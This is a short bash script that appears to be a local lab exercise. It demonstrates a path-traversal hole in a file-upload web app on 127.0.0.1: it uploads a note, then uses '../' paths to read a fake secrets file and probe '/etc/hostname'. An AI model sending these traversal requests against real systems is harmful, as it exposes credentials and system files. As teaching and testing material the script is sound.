#!/bin/bash
# 第四关：上传洞 + 假数据演示，全部打 127.0.0.1
BASE="http://127.0.0.1:8768"
D="/tmp/web4"

echo "=== 0 摸情况：首页功能 ==="
curl -s -m 5 "$BASE/" | head -c 400
echo
echo

echo "=== 1 正常上传一个便签 ==="
printf 'hello from normal upload\n' > "$D/note.txt"
curl -s -m 5 -F "file=@$D/note.txt" "$BASE/upload"
echo
echo "    查看刚传的文件："
curl -s -m 5 "$BASE/view?name=note.txt"
echo
echo

echo "=== 2 先探一下：能不能跳出上传目录（读上级的假配置）==="
curl -s -m 5 -G --data-urlencode 'name=../config/fake_secrets.env' "$BASE/view"
echo
echo

echo "=== 3 复现3次，确认稳定 ==="
for i in 1 2 3; do
  curl -s -m 5 -G --data-urlencode 'name=../config/fake_secrets.env' "$BASE/view" | head -c 200
  echo
done
echo

echo "=== 4 对照：读不存在的文件 ==="
curl -s -m 5 -G --data-urlencode 'name=../config/not_exist_xyz' "$BASE/view"
echo
echo

echo "=== 5 边界确认：根目录外的真实文件能不能读到（预期读不到）==="
curl -s -m 5 -G --data-urlencode 'name=../../etc/hostname' "$BASE/view" | head -c 200
echo
